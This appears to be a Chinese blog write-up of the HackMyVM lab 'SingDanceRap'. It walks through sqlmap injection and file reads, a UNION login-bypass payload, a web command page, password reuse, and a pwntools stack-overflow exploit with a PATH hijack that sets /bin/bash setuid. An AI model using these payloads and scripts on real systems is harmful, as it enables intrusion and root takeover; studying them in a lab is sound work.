---
title: SingDanceRap
author: hgbe02
date: 2025-06-20 14:30:26 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web,pwn]  
permalink: "/Hackmyvm/SingDanceRap.html"
---

# SingDanceRap

有小黑子.jpg！！！！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437050.png" alt="image-20250619011342615" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437052.png" alt="image-20250620074546486" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ rustscan -a $IP -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.101:22
Open 192.168.10.101:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 5d:41:2a:c1:2d:3b:6c:78:b3:af:ae:9d:42:fe:88:b8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZ6hx/MGKBFi0BVb/ijS9c+HCosUbXdx29X166sIvWds9M57+5aJrSBrBmTSRnUJgtFOglWUnacz2M85JOU6QFD9SQqcl04pELqje+1kMviENow5iRkgIfRGTs1PPs5mPBBE0U7PWnrmf2VJlZH8Vu1+J9ZKGVCOTeD+gk24l9HRHAS/3vrK+11OpzzkjpWXnV5ZITOqlxoX/XCGCVyCHE/TDdDzI1+NorjUPhVa0J+rgOsZJX0wyiWhwFP6NaIHlij6ajYOVYgHrtFon0C8GCnO1lPd+pJkSp0mNyZz0ZUB5fZNVRsmTCFZ5RVFuWgwO4TeubwN08PT4w/vXie1v7
|   256 3c:e9:64:eb:84:fe:5c:83:94:07:27:6c:12:14:c8:4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLt2cfQKRboXrnZ7oRSTyBMIGcM3o/UNUF+tulhHrT506rtXQ6OkSO78cDZybuYEVZu6oPfFw7dE29kgPQZuhIc=
|   256 09:9b:2b:18:de:6c:6d:f8:8b:15:df:6c:0f:c0:7c:b2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEf2M0an0IG9ZQAiT7MHE6AKovqVw9v65DDda8b+8R6q
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: News Website
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 08:00:27:FF:AA:AD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html txt php -t 100 2>/dev/null
                                                                                                                                                                                             
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       52l      128w     3118c http://192.168.10.101/index.html
200      GET       53l      108w     1301c http://192.168.10.101/news.php
200      GET       52l      128w     3118c http://192.168.10.101/
301      GET        9l       28w      324c http://192.168.10.101/littlesecrets => http://192.168.10.101/littlesecrets/
200      GET       69l      142w     1983c http://192.168.10.101/littlesecrets/login.php
302      GET        0l        0w        0c http://192.168.10.101/littlesecrets/manager.php => login.php
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437053.png" alt="image-20250620075033947" style="zoom:50%;" />

```text
http://192.168.10.101/news.php?title=dance
http://192.168.10.101/news.php?title=sing
http://192.168.10.101/news.php?title=rap
```

点击 `Read More`就会在结尾多一个`#`，说明只是移动到锚点，没请求新资源。

### SQL注入

我尝试了文件包含，但是未果，于是尝试 sql 注入：

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch

---
Parameter: title (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: title=sing' AND 9321=9321 AND 'IiCq'='IiCq

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=sing' AND (SELECT 4652 FROM (SELECT(SLEEP(5)))rPWE) AND 'CeNd'='CeNd

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: title=sing' UNION ALL SELECT NULL,CONCAT(0x71787a7171,0x4c48786e79414e524a636473727a656a4b7656486e7742594f76777551454a767a5a655374624c65,0x7171707a71),NULL-- -
---

┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch --dbs
available databases [4]:
[*] information_schema
[*] mysql
[*] news_db
[*] performance_schema

┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch -D news_db --tables
Database: news_db
[2 tables]
+-------+
| news  |
| users |
+-------+

┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch -D news_db -T news --dump
Database: news_db
Table: news
[3 entries]
+----+-------+--------------------------------+
| id | title | content                        |
+----+-------+--------------------------------+
| 1  | sing  | This is the content for sing.  |
| 2  | dance | This is the content for dance. |
| 3  | rap   | This is the content for rap.   |
+----+-------+--------------------------------+

┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch -D news_db -T users --dump
Database: news_db
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | password1 | user1    |
| 2  | password2 | user2    |
+----+-----------+----------+
```

这一看就毫无诚意的凭证一看就是错的。。。然后目录扫描结果出来了，有新的隐藏目录，尝试看看有些啥：

```text
http://192.168.10.101/littlesecrets/login.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437054.png" alt="image-20250620081339897" style="zoom:50%;" />

```html
<form action="login.php" method="POST">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <input type="submit" value="Login">
```

尝试进行注入：

```
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u http://192.168.10.101/littlesecrets/login.php --data "username=admin&password=password" --batch

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3526 FROM (SELECT(SLEEP(5)))hwGM) AND 'KQRF'='KQRF&password=password
---

┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u http://192.168.10.101/littlesecrets/login.php --data "username=admin&password=password" --batch --dbs
available databases [4]:
[*] information_schema
[*] mysql
[*] news_db
[*] performance_schema
```

和前面一模一样，尝试看看有没有漏掉啥信息，用之前那个，盲注太慢了。

但是没有发现啥东西，尝试利用sqlmap直接获取`os-shell`，但是失败了，使用方法可以参考：https://sqlmap.highlight.ink/usage，进行了几次命令注意到：

```bash
the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

尝试读取文件写入文件：

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch --file-read=/etc/passwd
---------------------

┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ cat /home/kali/.local/share/sqlmap/output/192.168.10.101/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
_rpc:x:106:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:107:65534::/var/lib/nfs:/usr/sbin/nologin
tftp:x:108:112:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
mysql:x:110:115:MySQL Server,,,:/nonexistent:/bin/false
he110wor1d:x:1001:1001::/home/he110wor1d:/bin/bash
```

可以正常读取！！看一下网站是否可以执行脚本文件：

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch --file-read=/etc/apache2/apache2.conf

┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ cat /home/kali/.local/share/sqlmap/output/192.168.10.101/files/_etc_apache2_apache2.conf
-----------------

DefaultRuntimeDir ${APACHE_RUN_DIR}

#
# PidFile: The file in which the server should record its process
# identification number when it starts.
# This needs to be set in /etc/apache2/envvars
#
PidFile ${APACHE_PID_FILE}

#
# Timeout: The number of seconds before receives and sends time out.
#
Timeout 300

#
# KeepAlive: Whether or not to allow persistent connections (more than
# one request per connection). Set to "Off" to deactivate.
#
KeepAlive On

#
# MaxKeepAliveRequests: The maximum number of requests to allow
# during a persistent connection. Set to 0 to allow an unlimited amount.
# We recommend you leave this number high, for maximum performance.
#
MaxKeepAliveRequests 100

#
# KeepAliveTimeout: Number of seconds to wait for the next request from the
# same client on the same connection.
#
KeepAliveTimeout 5


# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}

#
# HostnameLookups: Log the names of clients or just their IP addresses
# e.g., www.apache.org (on) or 204.62.129.132 (off).
# The default is off because it'd be overall better for the net if people
# had to knowingly turn this feature on, since enabling it means that
# each client request will result in AT LEAST one lookup request to the
# nameserver.
#
HostnameLookups Off

# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog ${APACHE_LOG_DIR}/error.log

#
# LogLevel: Control the severity of messages logged to the error_log.
# Available values: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the log level for particular modules, e.g.
# "LogLevel info ssl:warn"
#
LogLevel warn

# Include module configuration:
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

# Include list of ports to listen on
Include ports.conf


# Sets the default security model of the Apache2 HTTPD server. It does
# not allow access to the root filesystem outside of /usr/share and /var/www.
# The former is used by web applications packaged in Debian,
# the latter may be used for local directories served by the web server. If
# your system is serving content from a sub-directory in /srv you must allow
# access here, or in any related virtual host.
<Directory />
        Options FollowSymLinks
        AllowOverride None
        Require all denied
</Directory>

<Directory /usr/share>
        AllowOverride None
        Require all granted
</Directory>

<Directory /var/www/he110wor1d/>
        Options -Indexes
        AllowOverride None
        Require all granted
</Directory>

<VirtualHost *:80>
    DocumentRoot /var/www/he110wor1d
    <Directory /var/www/he110wor1d>
        Options -Indexes
        AllowOverride None
        Require all granted
    </Directory>

    <FilesMatch \.php$>
        SetHandler application/x-httpd-php
    </FilesMatch>

   ErrorLog ${APACHE_LOG_DIR}/xxx_error.log
   CustomLog ${APACHE_LOG_DIR}/xxx_access.log combined
</VirtualHost>



# AccessFileName: The name of the file to look for in each directory
# for additional configuration directives.  See also the AllowOverride
# directive.
#
AccessFileName .htaccess

#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
<FilesMatch "^\.ht">
        Require all denied
</FilesMatch>


#
# The following directives define some format nicknames for use with
# a CustomLog directive.
#
# These deviate from the Common Log Format definitions in that they use %O
# (the actual bytes sent including headers) instead of %b (the size of the
# requested file), because the latter makes it impossible to detect partial
# requests.
#
# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
# Use mod_remoteip instead.
#
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent

# Include of directories ignores editors' and dpkg's backup files,
# see README.Debian for details.

# Include generic snippets of statements
IncludeOptional conf-enabled/*.conf

# Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf

# vim: syntax=apache ts=4 sw=4 sts=4 sr noe
```

注意到网站目录为：`/var/www/he110wor1d`，包含了文件`.htaccess`（我没找到）以及可绑定执行php文件。

尝试写入一个`shell`然后激活：

```bash
# sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch --file-write=./revshell.php --file-dest=/var/www/he110wor1d/revshell.php
```

但是没有读取到。。。。可能没有写入权限？？尝试看一下几个源代码，尝试进行登录吧。。。。

```php
# sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch --file-read=/var/www/he110wor1d/littlesecrets/login.php
<?php
// Database connection
$servername = "localhost";
$username = "root";
$password = "i_love_sing_dance_rap";
$dbname = "news_db";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$login_error = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT id, username, password FROM users where username='$username'";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        if ($password === $row['password']) {
            session_start();
            $_SESSION['user_id'] = $row['id'];
            $_SESSION['username'] = $row['username'];
            header("Location: manager.php");
            exit();
        } else {
            $login_error = "Invalid username or password.";
        }
    } else {
        $login_error = "Invalid username or password.";
    }
}
$conn->close();

?>
```

```bash
# sqlmap -u "http://192.168.10.101/news.php?title=sing" --batch --file-read=/var/www/he110wor1d/littlesecrets/manager.php
<?php
session_start();

if (!isset($_SESSION['username'])) {
            header("Location: login.php");
            exit();
}

if ($_SESSION['username'] !== 'he110wor1d_admin') {
            die("Access Denied. You do not have permission to access this page.");
}

$command_output = '';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['command'])) {
            $command = $_POST['command'];
                $command_output = shell_exec($command);
}
?>
```

因为其 POST 参数是直接传入 sql 语句的，用户名已知为`he110wor1d_admin`，可以尝试万能密码进行绕过，但是发现一直失败，这是因为根本不存在这个用户，之前sql注入也没找到任何相关信息，只能尝试自己手动构造一个这样的用户了。。。。

得到了`root`级别的mysql数据库密码`i_love_sing_dance_rap`！！！！！

围绕着刚刚那个 sql 语句构造：

```sql
SELECT id, username, password FROM users where username='$username'
```

由于后面还有一个`password`的强比较，所以前后的 password，需要自洽！

```bash
# payload
username: ' union select '1','he110wor1d_admin','password
password: password
```

然后就进入了管理界面，可以执行代码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437055.png" alt="image-20250620091640424" style="zoom:50%;" />

尝试反弹shell！！！！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437056.png" alt="image-20250620091706133" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437057.png" alt="image-20250620091719969" style="zoom:50%;" />

```bash
(remote) www-data@singdancerap:/var/www/he110wor1d$ ls -la
total 24
drwxr-xr-x 3 root     root     4096 Feb 27 19:14 .
drwxr-xr-x 3 www-data www-data 4096 Mar  2 07:05 ..
-rwxr-xr-x 1 root     root     3118 Feb 27 19:11 index.html
drwxr-xr-x 2 root     root     4096 Feb 28 00:58 littlesecrets
-rw-r--r-- 1 root     root     2137 Feb 27 19:10 news.php
-rw-r--r-- 1 root     root     3200 Feb 27 18:29 styles.css
(remote) www-data@singdancerap:/var/www/he110wor1d$ cd littlesecrets
(remote) www-data@singdancerap:/var/www/he110wor1d/littlesecrets$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Feb 28 00:58 .
drwxr-xr-x 3 root root 4096 Feb 27 19:14 ..
-rw-r--r-- 1 root root 3144 Feb 27 20:07 login.php
-rw-r--r-- 1 root root 2788 Feb 27 21:24 manager.php
```

咱们果然没有写入文件。。。。。

## 提权

### 信息搜集

```bash
(remote) www-data@singdancerap:/var/www/he110wor1d/littlesecrets$ ls -la /home/          
total 12
drwxr-xr-x  3 root       root       4096 Mar  1 01:10 .
drwxr-xr-x 18 root       root       4096 Feb 27 16:41 ..
drwxr-x---  4 he110wor1d he110wor1d 4096 Mar  3 04:14 he110wor1d
(remote) www-data@singdancerap:/var/www/he110wor1d/littlesecrets$ cd /tmp
(remote) www-data@singdancerap:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
(remote) www-data@singdancerap:/tmp$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 810
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| news_db            |
| performance_schema |
+--------------------+
4 rows in set (0.000 sec)

MariaDB [(none)]> 
```

没东西，尝试密码复用，发现可以成功切换用户：`i_love_sing_dance_rap`

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437058.png" alt="image-20250620092454968" style="zoom:50%;" />

### 提权root

```bash
he110wor1d@singdancerap:/tmp$ cd ~
he110wor1d@singdancerap:~$ ls -la
total 32
drwxr-x--- 4 he110wor1d he110wor1d 4096 Mar  3 04:14 .
drwxr-xr-x 3 root       root       4096 Mar  1 01:10 ..
lrwxrwxrwx 1 he110wor1d he110wor1d    9 Feb 28 06:49 .bash_history -> /dev/null
-rw-r--r-- 1 he110wor1d he110wor1d  220 Apr 17  2019 .bash_logout
-rw-r--r-- 1 he110wor1d he110wor1d 3526 Apr 17  2019 .bashrc
drwxr-xr-x 3 he110wor1d he110wor1d 4096 Mar  1 07:23 .local
-rw-r--r-- 1 he110wor1d he110wor1d  807 Apr 17  2019 .profile
drwxr-x--- 2 he110wor1d he110wor1d 4096 Mar  3 04:21 thekey2root
-rw------- 1 he110wor1d he110wor1d  109 Feb 28 06:59 user.txt
he110wor1d@singdancerap:~$ cat user.txt 
#SQL injection can not only retrieve data but also forge it.

User flag:107883ee-f5e4-11ef-8542-005056207011
he110wor1d@singdancerap:~$ cd thekey2root/
he110wor1d@singdancerap:~/thekey2root$ ls -la
total 24
drwxr-x--- 2 he110wor1d he110wor1d  4096 Mar  3 04:21 .
drwxr-x--- 4 he110wor1d he110wor1d  4096 Mar  3 04:14 ..
-rwsr-sr-x 1 root       root       15472 Mar  1 00:23 thekey2root
```

将文件下到本地。先看一下保护和信息：

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ pwn checksec thekey2root 
[*] '/home/kali/temp/SingDanceRap/thekey2root'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ file thekey2root                                                                                                             
thekey2root: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3902296366fae4694e04363befc5aa43de900fa8, not stripped
```

未开启`PIE`，故使用的是绝对地址，通用，启用了`NX`，故栈上的 shellcode 不可执行。

反编译一下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  system("echo 'input something:'");
  input(&argc);
  system("echo 'thanks for your input'");
  return 0;
}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437059.png" alt="image-20250620093026139" style="zoom:50%;" />

找到了一个系统命令函数：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437060.png" alt="image-20250620092953949" style="zoom:50%;" />

还有一个调用：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437061.png" alt="image-20250620120912022" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437062.png" alt="image-20250620120938493" style="zoom:50%;" />

调用时，身份为 0 ，即 root 。

然后看一下`input`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437064.png" alt="image-20250620093209598" style="zoom:50%;" />

```c
int input()
{
  char v1; // [esp+Ch] [ebp-1Ch]

  return __isoc99_scanf("%s", &v1);
}
```

#### 计算偏移量

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ gdb ./thekey2root
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./thekey2root...
(No debugging symbols found in ./thekey2root)
gdb-peda$ run
Starting program: /home/kali/temp/SingDanceRap/thekey2root 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0xf7fc04c0 (LWP 6714) vfork to child process 6717]
[New inferior 2 (process 6717)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 6714 after child exec]
[Inferior 1 (process 6714) detached]
process 6717 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
input something:
[Inferior 2 (process 6717) exited normally]
Warning: not running
```

需要跟踪父进程：

```bash
gdb-peda$ set follow-fork-mode parent
gdb-peda$ run
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437065.png" alt="image-20250620110705307" style="zoom:50%;" />

```bash
gdb-peda$ pattern offset 0x41412941
1094789441 found at offset: 32
```

故偏移量为`32`

#### 构造相关payload

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ objdump -s -j .rodata thekey2root 

thekey2root:     file format elf32-i386

Contents of section .rodata:
 804a000 03000000 01000200 6563686f 2027696e  ........echo 'in
 804a010 70757420 736f6d65 7468696e 673a2700  put something:'.
 804a020 6563686f 20277468 616e6b73 20666f72  echo 'thanks for
 804a030 20796f75 7220696e 70757427 00257300   your input'.%s.
 804a040 6563686f 20274865 792c6272 6f212057  echo 'Hey,bro! W
 804a050 68617420 61726520 796f7520 6c6f6f6b  hat are you look
 804a060 696e6720 666f723f 2700               ing for?'.
```

一行十六位字符，数一下s是倒数第二个，对应前面的倒数第二个字节，十六进制为 73，地址即为，`804a03e`，倒数第一个字节为`00`

需要注意到：

> C 字符串通过数组连续存储，系统调用需按顺序解析字符
>
> C 语言依赖 `\0` 标记字符串结束，避免越界访问和未定义行为
>
> 后者若违反则会导致缓冲区溢出、命令注入漏洞

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ objdump -d thekey2root | grep system                             
08049040 <system@plt>:
 80491b6:       e8 85 fe ff ff          call   8049040 <system@plt>
 80491cd:       e8 6e fe ff ff          call   8049040 <system@plt>
 8049249:       e8 f2 fd ff ff          call   8049040 <system@plt>
```

随便选一个即可，但是发现没有`/bin/sh`供我们执行命令：

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ objdump -s -j .rodata thekey2root | grep 'sh'

```

采用劫持环境变量的方式，将`s`变为任意命令执行：

```bash
echo 'chmod +s /bin/bash' > s
chmod +x s
export PATH=.:$PATH
```

```python
from pwn import *

elf = ELF('./thekey2root')

offset = 32
xiaoheizi_addr = 0x08049213
system_addr = 0x080491b6
s_addr = 0x0804a03e

payload = b'A' * offset + p32(xiaoheizi_addr) + p32(system_addr) + p32(0xdeadbeef) + p32(s_addr)

r = remote('192.168.10.101', 2345)

r.send(payload)
r.interactive()
```

#### 挂载程序

```bash
he110wor1d@singdancerap:~$ whereis socat
socat: /usr/bin/socat /usr/share/man/man1/socat.1.gz
he110wor1d@singdancerap:~$ ls -la
total 36
drwxr-x--- 5 he110wor1d he110wor1d 4096 Jun 19 19:07 .
drwxr-xr-x 3 root       root       4096 Mar  1 01:10 ..
lrwxrwxrwx 1 he110wor1d he110wor1d    9 Feb 28 06:49 .bash_history -> /dev/null
-rw-r--r-- 1 he110wor1d he110wor1d  220 Apr 17  2019 .bash_logout
-rw-r--r-- 1 he110wor1d he110wor1d 3526 Apr 17  2019 .bashrc
drwxr-xr-x 3 he110wor1d he110wor1d 4096 Mar  1 07:23 .local
-rw-r--r-- 1 he110wor1d he110wor1d  807 Apr 17  2019 .profile
drwxr-xr-x 2 he110wor1d he110wor1d 4096 Jun 19 19:08 .ssh
drwxr-x--- 2 he110wor1d he110wor1d 4096 Mar  3 04:21 thekey2root
-rw------- 1 he110wor1d he110wor1d  109 Feb 28 06:59 user.txt
he110wor1d@singdancerap:~$ cd thekey2root/
he110wor1d@singdancerap:~/thekey2root$ ls -la
total 24
drwxr-x--- 2 he110wor1d he110wor1d  4096 Mar  3 04:21 .
drwxr-x--- 5 he110wor1d he110wor1d  4096 Jun 19 19:07 ..
-rwsr-sr-x 1 root       root       15472 Mar  1 00:23 thekey2root
he110wor1d@singdancerap:~/thekey2root$ pwd
/home/he110wor1d/thekey2root
he110wor1d@singdancerap:~/thekey2root$ echo 'chmod +s /bin/bash' > s
he110wor1d@singdancerap:~/thekey2root$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1302248 Apr 17  2019 /bin/bash
he110wor1d@singdancerap:~/thekey2root$ chmod +x s
he110wor1d@singdancerap:~/thekey2root$ PATH=.:$PATH
he110wor1d@singdancerap:~/thekey2root$ echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
he110wor1d@singdancerap:~/thekey2root$ socat tcp-l:2345,fork,reuseaddr exec:./thekey2root,reuseaddr

```

```bash
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ nc $IP 2345                           
input something:
aaaaa
thanks for your input
```

尝试运行指令但是报错：

```
┌──(kali㉿kali)-[~/temp/SingDanceRap]
└─$ python exp.py
[*] '/home/kali/temp/SingDanceRap/thekey2root'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Opening connection to 192.168.10.101 on port 2345: Done
[*] Switching to interactive mode
input something:
$ aaa
Hey,bro! What are you looking for?
$ whoami
[*] Got EOF while reading in interactive
$ id
$ aaa
[*] Closed connection to 192.168.10.101 port 2345
[*] Got EOF while sending in interactive
```

说明成功覆盖了，看一下是否执行成功了。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506201437066.png" alt="image-20250620143623258" style="zoom:50%;" />

